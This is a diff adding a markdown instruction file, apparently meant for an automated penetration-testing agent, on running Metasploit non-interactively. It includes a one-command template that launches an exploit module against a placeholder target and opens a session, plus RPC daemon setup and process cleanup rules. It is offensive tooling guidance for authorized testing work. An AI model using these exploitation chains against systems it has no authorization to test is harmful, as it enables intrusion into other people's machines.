@@ -1,0 +1,51 @@
+# METASPLOIT OPERATIONS
+
+Metasploit operational patterns for authorized penetration testing.
+
+## STANDALONE MODE
+
+<msf_standalone>
+One-command pattern for quick exploitation:
+msfconsole -q -x "use exploit/[path]; set RHOSTS [target]; set LPORT [port]; exploit; sleep 20; sessions -l; sessions -i 1 -c 'sysinfo'; exit"
+</msf_standalone>
+
+## RPC MODE
+
+<msf_rpc>
+For complex multi-stage operations:
+1. Check port: netstat -tulnp | grep [port]
+2. Start daemon: msfrpcd -P [password] -S -f msfrpcd.log (detach=true)
+3. Connect: msfconsole -x "db_connect msf:[password]@127.0.0.1/msf"
+4. Cleanup: pkill -f msfrpcd when done
+</msf_rpc>
+
+## CRITICAL RULES
+
+<msf_rules>
+1. NEVER run msfconsole without `-x` flag (will hang)
+2. ALWAYS end command chains with `;exit`
+3. Metasploit auto-starts handler on exploit -- don't manually start handlers
+4. Check orphans before starting: `ps aux | grep msf`
+5. Check port conflicts: `netstat -tulnp | grep [port]`
+6. Kill orphans before starting: `pkill -f msfconsole`
+7. Use unique LPORT values per session
+</msf_rules>
+
+## COMMON MISTAKES
+
+<msf_mistakes>
+- Running in interactive mode (without -x) causes hang
+- Missing ;exit leaves orphaned processes
+- Port conflicts from previous sessions
+- Starting unnecessary handlers
+- Not isolating sessions (use unique ports)
+</msf_mistakes>
+
+## DIAGNOSTIC COMMANDS
+
+<msf_diag>
+- Check orphans: `ps aux | grep msf`
+- Check ports: `netstat -tulnp | grep [port]`
+- Kill orphans: `pkill -f msfconsole`
+- List sessions: `msfconsole -q -x "sessions -l; exit"`
+</msf_diag>
